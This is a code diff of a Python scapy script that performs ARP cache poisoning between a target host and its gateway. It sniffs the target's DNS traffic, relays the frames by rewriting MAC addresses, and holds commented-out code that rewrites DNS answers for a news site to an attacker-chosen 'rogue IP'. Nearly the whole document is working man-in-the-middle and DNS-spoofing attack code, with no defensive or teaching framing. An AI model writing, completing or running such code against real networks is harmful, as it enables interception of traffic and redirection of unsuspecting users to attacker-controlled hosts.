@@ -1,7 +1,10 @@
+#!/usr/bin/python3
+
 from scapy.all import *
 from collections import deque
 import threading
 import time
+import os
 
 in_packets = deque([])
 out_packets = deque([])
@@ -41,59 +44,65 @@ def arppoison(targetip, gatewayip):
             poisonarpcache(targetip, targetmac, gatewayip)
             poisonarpcache(gatewayip, gatewaymac, targetip)
 
-    except KeyboardInterrupt:
+    except IndexError:
         print ("ARP spoofing stopped")
         restorearp(gatewayip, gatewaymac, targetip, targetmac)
         restorearp(targetip, targetmac, gatewayip, gatewaymac)
         quit()
 
 def sniffing(targetip):
-    global pacotes
-    sniff(filter = f'host {targetip}',prn = lambda x:in_packets.append(x))
+    sniff(filter = f'host {targetip} and udp port 53',prn = lambda x:in_packets.append(x))
 
-def checking(targetip,gatewayip):
+def checking(targetip,gatewayip, rogueip):
     while(True):
         try:
-            i = in_packets.popleft()
-            if (i[IP].proto.decode('UTF-8') == udp):
-                if(i[DNSQR].qname.decode('UTF-8') == "www.facebook.com."):
-                    ##modify
+            if (in_packets):
+                i = in_packets.popleft()
+                if(i[Ether].dst == '28:56:5a:49:ff:67' and i[Ether].src == getmac(targetip)):
+                    i[Ether].dst = getmac(gatewayip)
                     i.show()
-                    out_packets.append(i)
-                else:
-                    out_packets.append(i)
-            else:
+                if(i[Ether].dst == '28:56:5a:49:ff:67' and i[Ether].src == getmac(gatewayip)):
+                    i[Ether].dst = getmac(targetip)
+                    i.show()
+#                if("globo.com" in i[DNSQR].qname.decode('UTF-8')):
+#                    i[DNSRR][0].rdata = rogueip
+#                    i.show()
                 out_packets.append(i)
-        except Exception:
+#                else:
+#                    out_packets.append(i)
+            
+        except Exception as error:
             continue
-
-def forwarding ():
+            
+def forwarding():
     while(True):
         try:
             i = out_packets.popleft()
-            i.show()
-            send(i)
-        except Exception:
+            sendp(i)
+        except Exception as error:
             continue
 
 def main():
-    
+
     targetip = input("Enter Target IP:").rstrip()
     gatewayip = input("Enter Gateway IP:").rstrip()
-    
+    rogueip = input("Enter Rogue IP:").rstrip()
+
     try:   
-        arp_poison = threading.Thread(target=arppoison, args=(targetip, gatewayip))
+#        arp_poison = threading.Thread(target=arppoison, args=(targetip, gatewayip))
         sniff = threading.Thread(target=sniffing, args = (targetip,))
-        check = threading.Thread(target=checking, args=(targetip, gatewayip))
+        check = threading.Thread(target=checking, args=(targetip, gatewayip, rogueip))
         forward = threading.Thread(target=forwarding)
 
-        arp_poison.start()
+#        arp_poison.start()
         sniff.start()
         check.start()
         forward.start()
-        
+        while(True):
+            continue
+
     except KeyboardInterrupt:
-        arp_poison.join()
+        #arp_poison.join()
         sniff.join()
         check.join()
         forward.join()
